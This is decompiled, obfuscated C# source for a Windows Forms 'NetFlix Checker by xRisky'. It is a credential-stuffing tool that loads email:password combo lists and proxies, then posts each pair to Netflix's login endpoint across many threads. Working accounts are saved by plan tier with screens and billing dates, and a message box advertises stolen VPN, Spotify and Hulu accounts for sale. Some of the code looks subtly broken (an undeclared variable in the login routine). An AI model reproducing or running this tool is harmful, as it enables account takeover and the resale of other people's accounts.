﻿using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using MetroSuite;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using xNet;

namespace WindowsApp45
{
	[DesignerGenerated]
	public partial class ISection : Form
	{
		public ISection()
		{
			base.FormClosed += this.WellKnownServiceTypeEntry;
			base.Load += this.TypeCacheQueue;
			this.ParameterBuilder = false;
			this.ImportedFromTypeLibAttributeUnverifiableCodeAttribute = 0;
			this.MethodInfo();
			Control.CheckForIllegalCrossThreadCalls = false;
		}

		private void Empty(object sender, MouseEventArgs e)
		{
			<Module>.SoapFieldAttribute(3);
			this.EUCJPEncoding = e.Location;
		}

		private void Monitor(object sender, MouseEventArgs e)
		{
			<Module>.SoapFieldAttribute(4);
			checked
			{
				if (e.Button == MouseButtons.Left)
				{
					base.Left += e.X - this.EUCJPEncoding.X;
					base.Top += e.Y - this.EUCJPEncoding.Y;
				}
			}
		}

		private void method_0(object sender, MouseEventArgs e)
		{
			<Module>.SoapFieldAttribute(5);
			this.EUCJPEncoding = e.Location;
		}

		private void BinaryParser(object sender, MouseEventArgs e)
		{
			<Module>.SoapFieldAttribute(6);
			checked
			{
				if (e.Button == MouseButtons.Left)
				{
					base.Left += e.X - this.EUCJPEncoding.X;
					base.Top += e.Y - this.EUCJPEncoding.Y;
				}
			}
		}

		private void SafeProvHandleInternalElementTypeE(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(7);
			int num = (int)MessageBox.Show("Are you sure you want to close", "NetFlix Checker by xRisky", MessageBoxButtons.YesNo);
			int num2 = num;
			if (num2 != 7 && num2 == 6)
			{
				Application.Exit();
			}
		}

		private void RijndaelManaged(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(8);
			int num = (int)MessageBox.Show("Are you sure you want to close", "NetFlix Checker by xRisky", MessageBoxButtons.YesNo);
			int num2 = num;
			if (num2 != 7 && num2 == 6)
			{
				Application.Exit();
			}
		}

		private void CommonAcl(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(9);
			this.UrlAttribute.BackColor = Color.FromArgb(255, 69, 69);
			this.Attributes.BackColor = Color.FromArgb(255, 69, 69);
		}

		private void CalendarId(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(10);
			this.UrlAttribute.BackColor = Color.FromArgb(45, 45, 48);
			this.Attributes.BackColor = Color.FromArgb(45, 45, 48);
		}

		private void EntryPointEntryFieldId(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(11);
			this.UrlAttribute.BackColor = Color.FromArgb(255, 69, 69);
			this.Attributes.BackColor = Color.FromArgb(255, 69, 69);
		}

		private void CryptographicException(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(12);
			this.UrlAttribute.BackColor = Color.FromArgb(45, 45, 48);
			this.Attributes.BackColor = Color.FromArgb(45, 45, 48);
		}

		private void CallBackHelper(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(13);
			this.KeyContainerPermissionAccessEntry.BackColor = Color.FromArgb(60, 60, 60);
			this.SendOrPostCallback.BackColor = Color.FromArgb(60, 60, 60);
		}

		private void Variant(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(14);
			this.KeyContainerPermissionAccessEntry.BackColor = Color.FromArgb(45, 45, 48);
			this.SendOrPostCallback.BackColor = Color.FromArgb(45, 45, 48);
		}

		private void HashtableEnumerator(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(15);
			this.KeyContainerPermissionAccessEntry.BackColor = Color.FromArgb(60, 60, 60);
			this.SendOrPostCallback.BackColor = Color.FromArgb(60, 60, 60);
		}

		private void SpecialFolder(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(16);
			this.KeyContainerPermissionAccessEntry.BackColor = Color.FromArgb(45, 45, 48);
			this.SendOrPostCallback.BackColor = Color.FromArgb(45, 45, 48);
		}

		private void CodeConnectAccess(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(17);
			base.WindowState = FormWindowState.Minimized;
		}

		private void ParseRecord(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(18);
			base.WindowState = FormWindowState.Minimized;
		}

		private void UIPermissionClipboard(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(19);
			Interaction.MsgBox("  - Shop Account -\r\n\r\nNrodVpn\r\nWindscribe Vpn\r\nZenMate Vpn\r\nIPVanish VPN\r\nExpressVPN\r\nSpotify ( All Plans ) x5 Accounts\r\nHulu ( All Plans ) x5 Accounts\r\nAnd More ..", MsgBoxStyle.Information, null);
		}

		private void ICollection(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(20);
			Interaction.MsgBox("  - Shop Account -\r\n\r\nNrodVpn\r\nWindscribe Vpn\r\nZenMate Vpn\r\nIPVanish VPN\r\nExpressVPN\r\nSpotify ( All Plans ) x5 Accounts\r\nHulu ( All Plans ) x5 Accounts\r\nAnd More ..", MsgBoxStyle.Information, null);
		}

		private void TypeLoadExceptionHolder(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(21);
			this.SynchronizationContextProperties.BackColor = Color.FromArgb(255, 69, 69);
			this.CATEGORYSUBCATEGORYInternalRemotingServices.BackColor = Color.FromArgb(255, 69, 69);
		}

		private void LOGIC(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(22);
			this.SynchronizationContextProperties.BackColor = Color.FromArgb(40, 40, 40);
			this.CATEGORYSUBCATEGORYInternalRemotingServices.BackColor = Color.FromArgb(40, 40, 40);
		}

		private void MaskGenerationMethod(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(23);
			this.SynchronizationContextProperties.BackColor = Color.FromArgb(255, 69, 69);
			this.CATEGORYSUBCATEGORYInternalRemotingServices.BackColor = Color.FromArgb(255, 69, 69);
		}

		private void AppDomainLevelActivator(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(24);
			this.SynchronizationContextProperties.BackColor = Color.FromArgb(40, 40, 40);
			this.CATEGORYSUBCATEGORYInternalRemotingServices.BackColor = Color.FromArgb(40, 40, 40);
		}

		private void ChannelEntry(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(25);
			base.WindowState = FormWindowState.Minimized;
		}

		private void SafeWaitHandle(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(26);
			base.WindowState = FormWindowState.Minimized;
		}

		private void AllowReversePInvokeCallsAttribute(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(27);
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.Filter = "Combo (*.txt)|*.txt";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					HMAC.SiteIdentityPermissionAttribute.Clear();
					this.ImportedFromTypeLibAttributeUnverifiableCodeAttribute = 0;
					HMAC.SiteIdentityPermissionAttribute.AddRange(File.ReadAllLines(openFileDialog.FileName).Distinct<string>());
					this.AppDomainUnloadedException.Text = "Combo ( " + HMAC.SiteIdentityPermissionAttribute.Count.ToString() + " )";
					HMAC.FileIOPermissionAccess = HMAC.SiteIdentityPermissionAttribute.Count;
					this.ImportedFromTypeLibAttributeUnverifiableCodeAttribute = checked(File.ReadAllLines(openFileDialog.FileName).Length - HMAC.SiteIdentityPermissionAttribute.Count);
					this.SoapNcName.Text = "( " + this.ImportedFromTypeLibAttributeUnverifiableCodeAttribute.ToString() + " )";
					this.Currency.Text = Conversions.ToString(HMAC.SiteIdentityPermissionAttribute.Count);
				}
			}
			catch (Exception ex)
			{
			}
		}

		private void SecurityContextRunData(object sender, DragEventArgs e)
		{
			<Module>.SoapFieldAttribute(28);
			try
			{
				string[] array = (string[])e.Data.GetData(DataFormats.FileDrop, false);
				HMAC.SiteIdentityPermissionAttribute.Clear();
				foreach (string path in array)
				{
					HMAC.TokenizerStringBlock.AddRange(File.ReadAllLines(path).Distinct<string>());
				}
				HMAC.SiteIdentityPermissionAttribute.AddRange(HMAC.TokenizerStringBlock.Distinct<string>());
				HMAC.TokenizerStringBlock.Clear();
				this.AppDomainUnloadedException.Text = "Combo ( " + HMAC.SiteIdentityPermissionAttribute.Count.ToString() + " )";
				this.Currency.Text = Conversions.ToString(HMAC.SiteIdentityPermissionAttribute.Count);
				HMAC.FileIOPermissionAccess = HMAC.SiteIdentityPermissionAttribute.Count;
			}
			catch (Exception ex)
			{
			}
		}

		private void ImportedFromTypeLibAttribute(object sender, DragEventArgs e)
		{
			<Module>.SoapFieldAttribute(29);
			if (!e.Data.GetDataPresent(DataFormats.Bitmap) || (e.AllowedEffect & DragDropEffects.Copy) <= DragDropEffects.None)
			{
				e.Effect = DragDropEffects.Copy;
			}
		}

		private void DecoderFallbackException(object sender, EventArgs e)
		{
			this.DebuggerStepperBoundaryAttribute = string.Empty;
		}

		private void StackEnumeratorObjectCreationDelegate(object sender, DragEventArgs e)
		{
			<Module>.SoapFieldAttribute(30);
			if (Operators.CompareString(this.DebuggerStepperBoundaryAttribute, string.Empty, false) == 0)
			{
				this.DebuggerStepperBoundaryAttribute = string.Empty;
				foreach (string text in e.Data.GetFormats())
				{
					if (Operators.CompareString(text, "FileNameW", false) == 0)
					{
						object objectValue = RuntimeHelpers.GetObjectValue(e.Data.GetData(text));
						if (!(objectValue is string[]))
						{
							e.Effect = DragDropEffects.None;
						}
						else
						{
							this.DebuggerStepperBoundaryAttribute = Conversions.ToString(NewLateBinding.LateIndexGet(objectValue, new object[]
							{
								0
							}, null));
							if (this.DebuggerStepperBoundaryAttribute.ToLower().EndsWith(".txt"))
							{
								e.Effect = DragDropEffects.Copy;
							}
							else
							{
								e.Effect = DragDropEffects.None;
								this.DebuggerStepperBoundaryAttribute = string.Empty;
							}
						}
					}
				}
			}
		}

		private unsafe void SHA512Managed(object sender, MetroTrackbar.TrackbarEventArgs e)
		{
			<Module>.SoapFieldAttribute(31);
			byte* ptr = stackalloc byte[(UIntPtr)4];
			int value = this.Context.Value;
			*(int*)ptr = value;
			this.CrossAppDomainChannel.Text = string.Concat(new string[]
			{
				((int*)ptr)->ToString()
			});
		}

		private unsafe void IsCopyConstructed(object sender, MetroTrackbar.TrackbarEventArgs e)
		{
			<Module>.SoapFieldAttribute(32);
			byte* ptr = stackalloc byte[(UIntPtr)4];
			int value = this.ThreadStart.Value;
			*(int*)ptr = value;
			this.IEnumSTORECATEGORYSUBCATEGORY.Text = string.Concat(new string[]
			{
				((int*)ptr)->ToString()
			});
		}

		private void ITypeComp(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(33);
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.Filter = "Proxy (*.txt)|*.txt";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					HMAC.ObjectAuditRule.Clear();
					HMAC.ObjectAuditRule.AddRange(File.ReadAllLines(openFileDialog.FileName));
					this.CompatibilityFlag.Text = "Proxies ( " + HMAC.ObjectAuditRule.Count.ToString() + " )";
				}
			}
			catch (Exception ex)
			{
			}
		}

		private void InAttribute(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(34);
			checked
			{
				if (Operators.CompareString(this.AppDomainUnloadedException.Text, "Combo", false) == 0)
				{
					Interaction.MsgBox(" - Add Combo ", MsgBoxStyle.Information, null);
				}
				else if (!(this.ScopeTree.Checked & Operators.CompareString(this.CompatibilityFlag.Text, "ProxyLess", false) == 0))
				{
					this.CommonAclSafeLsaLogonProcessHandle = System.DateTime.Now.ToString("dd MMMM (HH;mm)");
					this.ResourceType = "Results\\" + this.CommonAclSafeLsaLogonProcessHandle;
					Directory.CreateDirectory(this.ResourceType);
					Directory.CreateDirectory("Results\\" + this.ResourceType + "\\Premiums");
					Directory.CreateDirectory("Results\\" + this.ResourceType + "\\Standard");
					Directory.CreateDirectory("Results\\" + this.ResourceType + "\\Basic");
					this.ParameterBuilder = true;
					HMAC.AssemblyHashAlgorithm.Clear();
					for (int i = 0; i < this.Context.Value; i++)
					{
						this.DirectoryInfo = new Thread(new ThreadStart(this.AccessRule))
						{
							IsBackground = false
						};
						HMAC.AssemblyHashAlgorithm.Add(this.DirectoryInfo);
						this.DirectoryInfo.Start();
					}
					this.AppDomainUnloadedException.Enabled = false;
					this.CMSHASHDIGESTMETHOD.Enabled = false;
					this.AssemblyBuilderAccess.Enabled = true;
					this.TOKENGROUPSOverlappedDataCacheLine.Enabled = false;
				}
				if (this.AssemblyBuilderAccess.Enabled)
				{
					this.AssemblyBuilderAccess.ForeColor = Color.FromArgb(200, 200, 200);
				}
			}
		}

		private void ConstructorOnTypeBuilderInstantiation(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(35);
			checked
			{
				if (Operators.CompareString(this.AppDomainUnloadedException.Text, "Combo", false) == 0)
				{
					Interaction.MsgBox(" - Add Combo ", MsgBoxStyle.Information, null);
				}
				else if (this.ScopeTree.Checked & Operators.CompareString(this.CompatibilityFlag.Text, "Proxies", false) == 0)
				{
					Interaction.MsgBox(" - Add Proxeis ", MsgBoxStyle.Information, null);
				}
				else if (this.ResolveEventArgsSHA384.Checked & Operators.CompareString(this.ISerializable.Text, "Load Proxies", false) == 0)
				{
					Interaction.MsgBox("Add Link Proxies\r\nThen Click ( Load Proxies )", MsgBoxStyle.Information, null);
				}
				else if (Operators.CompareString(this.TOKENGROUPSOverlappedDataCacheLine.Text, "", false) != 0)
				{
					if (this.SoapIntegerInt32.Checked & Operators.CompareString(this.TypeResolveHandler.Text, "Load Proxies", false) == 0)
					{
						Interaction.MsgBox("Choose Site\r\nThen Click ( Load Proxies )", MsgBoxStyle.Information, null);
					}
					else
					{
						this.CommonAclSafeLsaLogonProcessHandle = System.DateTime.Now.ToString("dd MMMM (HH;mm;ss)");
						this.ResourceType = "Results\\" + this.CommonAclSafeLsaLogonProcessHandle;
						Directory.CreateDirectory(this.ResourceType);
						Directory.CreateDirectory("Results\\" + this.CommonAclSafeLsaLogonProcessHandle + "\\Premiums");
						Directory.CreateDirectory("Results\\" + this.CommonAclSafeLsaLogonProcessHandle + "\\Standard");
						Directory.CreateDirectory("Results\\" + this.CommonAclSafeLsaLogonProcessHandle + "\\Basic");
						this.ParameterBuilder = true;
						HMAC.AssemblyHashAlgorithm.Clear();
						for (int i = 0; i < this.Context.Value; i++)
						{
							this.DirectoryInfo = new Thread(new ThreadStart(this.AccessRule))
							{
								IsBackground = false
							};
							HMAC.AssemblyHashAlgorithm.Add(this.DirectoryInfo);
							this.DirectoryInfo.Start();
						}
						this.AppDomainUnloadedException.ForeColor = Color.FromArgb(105, 105, 105);
						this.AppDomainUnloadedException.Enabled = false;
						this.CMSHASHDIGESTMETHOD.Enabled = false;
						this.AssemblyBuilderAccess.Enabled = true;
					}
				}
				else
				{
					Interaction.MsgBox("Choose the Proxy type", MsgBoxStyle.Information, null);
				}
				if (this.AssemblyBuilderAccess.Enabled)
				{
					this.AssemblyBuilderAccess.ForeColor = Color.FromArgb(200, 200, 200);
				}
				if (!this.CMSHASHDIGESTMETHOD.Enabled)
				{
					this.CMSHASHDIGESTMETHOD.ForeColor = Color.FromArgb(105, 105, 105);
				}
			}
		}

		private void ArraySegment1(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(36);
			this.ParameterBuilder = false;
			using (IEnumerator<Thread> enumerator = (IEnumerator<Thread>)HMAC.AssemblyHashAlgorithm.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					Thread thread = enumerator.Current;
					thread.Abort();
				}
			}
			this.AppDomainUnloadedException.Enabled = true;
			this.TOKENGROUPSOverlappedDataCacheLine.Enabled = true;
			this.CMSHASHDIGESTMETHOD.Enabled = true;
			this.AssemblyBuilderAccess.Enabled = false;
			this.AppDomainUnloadedException.ForeColor = Color.FromArgb(200, 200, 200);
			this.CMSHASHDIGESTMETHOD.ForeColor = Color.FromArgb(200, 200, 200);
			if (HMAC.SiteIdentityPermissionAttribute.Count == 0)
			{
				MessageBox.Show("Work completed! Thread are stopped ..", "NetFlix Checker by xRisky", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
			else
			{
				Interaction.MsgBox("...Done Stopped", MsgBoxStyle.Information, null);
			}
			if (!this.AssemblyBuilderAccess.Enabled)
			{
				this.AssemblyBuilderAccess.ForeColor = Color.FromArgb(105, 105, 105);
			}
		}

		private void WeakReference(string string_0, string string_1)
		{
			<Module>.SoapFieldAttribute(37);
			if (string_2.Contains(":"))
			{
				string_2 = string_2.Split(new char[]
				{
					':'
				})[0];
			}
			using (HttpRequest httpRequest = new HttpRequest())
			{
				try
				{
					httpRequest.Cookies = new CookieDictionary(false);
					if (Operators.CompareString(this.TOKENGROUPSOverlappedDataCacheLine.Text, "HTTP/s", false) == 0)
					{
						httpRequest.Proxy = HttpProxyClient.Parse(IUnrestrictedPermissionUrlIdentityPermission.EventItfInfoRfc2898DeriveBytes());
					}
					if (Operators.CompareString(this.TOKENGROUPSOverlappedDataCacheLine.Text, "SOCKS-4", false) == 0)
					{
						httpRequest.Proxy = Socks4ProxyClient.Parse(IUnrestrictedPermissionUrlIdentityPermission.EventItfInfoRfc2898DeriveBytes());
					}
					if (Operators.CompareString(this.TOKENGROUPSOverlappedDataCacheLine.Text, "SOCKS-5", false) == 0)
					{
						httpRequest.Proxy = Socks5ProxyClient.Parse(IUnrestrictedPermissionUrlIdentityPermission.EventItfInfoRfc2898DeriveBytes());
					}
					httpRequest.IgnoreProtocolErrors = true;
					httpRequest.AllowAutoRedirect = true;
					httpRequest.KeepAlive = true;
					httpRequest.Referer = "https://www.netflix.com/co/Login";
					httpRequest.UserAgent = Http.ChromeUserAgent();
					httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36";
					httpRequest.AddHeader("Cache-Control", "max-age=0");
					string str = "";
					string text = httpRequest.Get("https://www.netflix.com/es-en/login", null).ToString();
					if (text.Contains("<input type=\"hidden\" name=\"authURL\" value=\""))
					{
						str = Regex.Match(text, "<input type=\"hidden\" name=\"authURL\" value=\"([^\"]*)").Groups[1].ToString();
					}
					httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36";
					httpRequest.AddHeader("Cache-Control", "max-age=0");
					httpRequest.Referer = "https://www.netflix.com/es-en/login";
					string str2 = string.Concat(new string[]
					{
						"email=",
						Http.UrlEncode(string_2, null),
						"&password=",
						string_1,
						"&rememberMe=true&flow=websiteSignUp&mode=login&action=loginAction&withFields=rememberMe%2CnextPage%2Cemail%2Cpassword&nextPage=&showPassword=&authURL=",
						Http.UrlEncode(str, null)
					});
					text = httpRequest.Post("https://www.netflix.com/Login?nextpage=https%3A%2F%2Fwww.netflix.com%2FYourAccount", str2, "application/x-www-form-urlencoded").ToString();
					if (text.Contains("\"membershipStatus\":\"CURRENT_MEMBER\""))
					{
						this.SafePointer("good", string_2 + ":" + string_1, "good");
						if (text.Contains("membershipStatus\":\"NEVER_MEMBER\""))
						{
							Label label;
							(label = this.Stream).Text = Conversions.ToString(Conversions.ToDouble(label.Text) + 1.0);
							File.AppendAllText(this.ResourceType + "\\Free.txt", string.Concat(new string[]
							{
								"Email : ",
								string_2,
								"\r\nPassword : ",
								string_1,
								"\r\nCombo : ",
								string_2,
								":",
								string_1,
								"\r\nNetFlix Checker | by xRisky\r\n================\r\n"
							}));
						}
						else if (text.Contains("membershipStatus\":\"FORMER_MEMBER"))
						{
							Label label;
							(label = this.Stream).Text = Conversions.ToString(Conversions.ToDouble(label.Text) + 1.0);
							File.AppendAllText(this.ResourceType + "\\Free.txt", string.Concat(new string[]
							{
								"Email : ",
								string_2,
								"\r\nPassword : ",
								string_1,
								"\r\nCombo : ",
								string_2,
								":",
								string_1,
								"\r\nNetFlix Checker | by xRisky\r\n================\r\n"
							}));
						}
						else if (!text.Contains("mode\"welcome\","))
						{
							string IInternalMessage = Regex.Match(text, "currentPlanName\":\"([^\"]*)").Groups[1].Value;
							string DES = Regex.Match(text, "maxStreams\":(\\d*)").Groups[1].Value;
							string value = Regex.Match(text, "hasHD\":([^,]*)").Groups[1].Value;
							string value2 = Regex.Match(text, "hasUHD\":([^,]*)").Groups[1].Value;
							string RemotingSurrogateSelector = Regex.Match(text, "displayName\":\"[^\"]*\",\"id\":\"([^\"]*)").Groups[1].Value;
							string value3 = Regex.Match(text, "\"nextBillingDate\":\"(.*?)\"").Groups[1].Value;
							string PermissionToken = value3.Replace("\\x2F", "-").Replace("\\u200F", "");
							string string_0 = value.Replace("true", "Yes").Replace("false", "No");
							string OverlappedDataCacheBaseChannelSinkWithProperties = value2.Replace("true", "Yes").Replace("false", "No");
							File.AppendAllText(this.ResourceType + "\\All Plan.txt", string.Concat(new string[]
							{
								"Email : ",
								string_2,
								"\r\nPassword : ",
								string_1,
								"\r\nCombo : ",
								string_2,
								":",
								string_1,
								"\r\nPlan : ",
								IInternalMessage,
								"\r\nScreens : ",
								DES,
								"\r\nHD : ",
								value,
								"\r\nUHD : ",
								value2,
								"\r\nExpires in : ",
								PermissionToken,
								"\r\nCountry : ",
								RemotingSurrogateSelector,
								"\r\nNetFlix Checker | by xRisky\r\n================\r\n"
							}));
							if (text.Contains("currentPlanName\":\"Premium"))
							{
								Label label;
								(label = this.LocalBuilderContextAttributeEntry).Text = Conversions.ToString(Conversions.ToDouble(label.Text) + 1.0);
								File.AppendAllText(this.ResourceType + "\\Premiums\\Premiums.txt", string.Concat(new string[]
								{
									"Email : ",
									string_2,
									"\r\nPassword : ",
									string_1,
									"\r\nCombo : ",
									string_2,
									":",
									string_1,
									"\r\nPlan : ",
									IInternalMessage,
									"\r\nScreens : ",
									DES,
									"\r\nHD : ",
									value,
									"\r\nUHD : ",
									value2,
									"\r\nExpires in : ",
									PermissionToken,
									"\r\nCountry : ",
									RemotingSurrogateSelector,
									"\r\nNetFlix Checker | by xRisky\r\n================\r\n"
								}));
							}
							else if (text.Contains("currentPlanName\":\"Standard"))
							{
								Label label;
								(label = this.UnmanagedFunctionPointerAttribute).Text = Conversions.ToString(Conversions.ToDouble(label.Text) + 1.0);
								File.AppendAllText(this.ResourceType + "\\Standard\\Standard.txt", string.Concat(new string[]
								{
									"Email : ",
									string_2,
									"\r\nPassword : ",
									string_1,
									"\r\nCombo : ",
									string_2,
									":",
									string_1,
									"\r\nPlan : ",
									IInternalMessage,
									"\r\nScreens : ",
									DES,
									"\r\nHD : ",
									value,
									"\r\nUHD : ",
									value2,
									"\r\nExpires in : ",
									PermissionToken,
									"\r\nCountry : ",
									RemotingSurrogateSelector,
									"\r\nNetFlix Checker | by xRisky\r\n================\r\n"
								}));
							}
							else if (text.Contains("currentPlanName\":\"Basic"))
							{
								Label label;
								(label = this.StateManagerRunningState).Text = Conversions.ToString(Conversions.ToDouble(label.Text) + 1.0);
								File.AppendAllText(this.ResourceType + "\\Basic\\Basic.txt", string.Concat(new string[]
								{
									"Email : ",
									string_2,
									"\r\nPassword : ",
									string_1,
									"\r\nCombo : ",
									string_2,
									":",
									string_1,
									"\r\nPlan : ",
									IInternalMessage,
									"\r\nScreens : ",
									DES,
									"\r\nHD : ",
									value,
									"\r\nUHD : ",
									value2,
									"\r\nExpires in : ",
									PermissionToken,
									"\r\nCountry : ",
									RemotingSurrogateSelector,
									"\r\nNetFlix Checker | by xRisky\r\n================\r\n"
								}));
							}
							this.RuntimeEventInfo.Invoke(new MethodInvoker(delegate()
							{
								this.RuntimeEventInfo.Rows.Add(new object[]
								{
									string_2 + ":" + string_1,
									IInternalMessage,
									DES,
									string_0,
									OverlappedDataCacheBaseChannelSinkWithProperties,
									PermissionToken,
									RemotingSurrogateSelector
								});
							}));
						}
						else
						{
							Label label;
							(label = this.Stream).Text = Conversions.ToString(Conversions.ToDouble(label.Text) + 1.0);
							File.AppendAllText(this.ResourceType + "\\Free.txt", string.Concat(new string[]
							{
								"Email : ",
								string_2,
								"\r\nPassword : ",
								string_1,
								"\r\nCombo : ",
								string_2,
								":",
								string_1,
								"\r\nNetFlix Checker | by xRisky\r\n================\r\n"
							}));
						}
					}
					else if (text.Contains("membershipStatus\":\"ANONYMOUS\"") | text.Contains("unrecognized_email") | text.Contains("Please try again") | text.Contains("incorrect_password"))
					{
						this.SafePointer("bad", string_2 + ":" + string_1, "bad");
						File.AppendAllText(this.ResourceType + "\\bad.txt", string_2 + ":" + string_1 + "\r\n");
					}
					else
					{
						this.SafePointer("error", string_2 + ":" + string_1, "error");
					}
				}
				catch (HttpException ex)
				{
					this.SafePointer("error", string_2 + ":" + string_1, "error");
				}
			}
		}

		private void SafePointer(string string_0, string string_1, string string_2)
		{
			<Module>.SoapFieldAttribute(38);
			checked
			{
				lock (this)
				{
					if (Operators.CompareString(string_0, "good", false) == 0)
					{
						HMAC.BinaryFormatter++;
						HMAC.FileIOPermissionAccess--;
						Label namedPermissionSet;
						(namedPermissionSet = this.NamedPermissionSet).Text = Conversions.ToString(unchecked(Conversions.ToDouble(namedPermissionSet.Text) + 1.0));
					}
					if (Operators.CompareString(string_0, "bad", false) == 0)
					{
						HMAC.StrongNameMembershipCondition++;
						HMAC.FileIOPermissionAccess--;
						Label namedPermissionSet;
						(namedPermissionSet = this.NamedPermissionSet).Text = Conversions.ToString(unchecked(Conversions.ToDouble(namedPermissionSet.Text) + 1.0));
					}
					if (Operators.CompareString(string_0, "error", false) == 0)
					{
						HMAC.SiteIdentityPermissionAttribute.Insert(0, string_1);
						HMAC.InheritanceFlagsTypeLimitingDeserializationBinder++;
					}
					if (Operators.CompareString(string_0, "errorr", false) == 0)
					{
						HMAC.InheritanceFlagsTypeLimitingDeserializationBinder++;
					}
					base.Invoke(new MethodInvoker(delegate()
					{
						<Module>.SoapFieldAttribute(136);
						this.Currency.Text = HMAC.FileIOPermissionAccess.ToString();
						this.MarshalAsAttributeCodeGroupStack.Text = HMAC.BinaryFormatter.ToString();
						this.ApplicationTrustEnumerator.Text = HMAC.StrongNameMembershipCondition.ToString();
						this.FileStreamAsyncResult.Text = HMAC.InheritanceFlagsTypeLimitingDeserializationBinder.ToString();
					}));
				}
			}
		}

		private void WellKnownServiceTypeEntry(object sender, FormClosedEventArgs e)
		{
			<Module>.SoapFieldAttribute(39);
			Process.GetCurrentProcess().Kill();
		}

		private void TypeCacheQueue(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(40);
			this.AssemblyBuilderAccess.Enabled = false;
			base.FormBorderStyle = FormBorderStyle.None;
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.LeftColor = Color.FromArgb(63, 63, 63);
			this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Enabled = false;
			this.ExceptionInfo.Enabled = false;
			this.AssemblyAlgorithmIdAttribute.Enabled = false;
			if (!this.AssemblyBuilderAccess.Enabled)
			{
				this.AssemblyBuilderAccess.ForeColor = Color.FromArgb(105, 105, 105);
			}
			else if (this.AssemblyBuilderAccess.Enabled)
			{
				this.AssemblyBuilderAccess.ForeColor = Color.FromArgb(200, 200, 200);
			}
			this.TOKENPRIVILEGE.ForeColor = Color.FromArgb(105, 105, 105);
			this.ISerializable.ForeColor = Color.FromArgb(105, 105, 105);
		}

		private void AccessRule()
		{
			<Module>.SoapFieldAttribute(41);
			while (this.ParameterBuilder)
			{
				try
				{
					string text = string.Empty;
					string string_ = string.Empty;
					string string_2 = string.Empty;
					object @decimal = IUnrestrictedPermissionUrlIdentityPermission.Decimal;
					ObjectFlowControl.CheckForSyncLockOnValueType(@decimal);
					lock (@decimal)
					{
						if (HMAC.SiteIdentityPermissionAttribute.Count > 0)
						{
							text = HMAC.SiteIdentityPermissionAttribute[0];
							HMAC.SiteIdentityPermissionAttribute.RemoveAt(0);
						}
						else if (HMAC.SiteIdentityPermissionAttribute.Count == 0)
						{
							break;
						}
					}
					if (!string.IsNullOrEmpty(text))
					{
						if (text.Contains(";"))
						{
							string_ = text.Split(new char[]
							{
								';'
							})[0].Trim();
							string_2 = text.Split(new char[]
							{
								';'
							})[1].Trim();
						}
						if (text.Contains(":"))
						{
							string_ = text.Split(new char[]
							{
								':'
							})[0].Trim();
							string_2 = text.Split(new char[]
							{
								':'
							})[1].Trim();
						}
						this.WeakReference(string_, string_2);
					}
					else
					{
						Thread.Sleep(900);
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		private void Nullable1()
		{
			<Module>.SoapFieldAttribute(42);
			if (!Directory.Exists("Results\\" + this.CommonAclSafeLsaLogonProcessHandle))
			{
				Directory.CreateDirectory("Results\\" + this.CommonAclSafeLsaLogonProcessHandle);
			}
		}

		private void DriveType(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(43);
			this.Nullable1();
			Process.Start("Results\\" + this.CommonAclSafeLsaLogonProcessHandle);
		}

		private void ISoapXsd(object sender, EventArgs e)
		{
			<Module>.SoapFieldAttribute(44);
			if (this.ScopeTree.Checked)
			{
				this.ResolveEventArgsSHA384.Checked = false;
				this.TOKENPRIVILEGE.Checked = false;
				this.SoapIntegerInt32.Checked = false;
				this.MarshalByRefObject.Text = "Link";
				this.CompatibilityFlag.Enabled = true;
				this.MarshalByRefObject.Enabled = false;
				this.JitHelpers.Checked = false;
				this.TOKENPRIVILEGE.Enabled = false;
				this.IDescriptionMetadataEntry.Enabled = false;
				this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.Enabled = false;
				this.ISerializable.Enabled = false;
				this.AssemblyRequestEntryFieldIdKoreanLunisolarCalendar.LeftColor = Color.FromArgb(63, 63, 63);
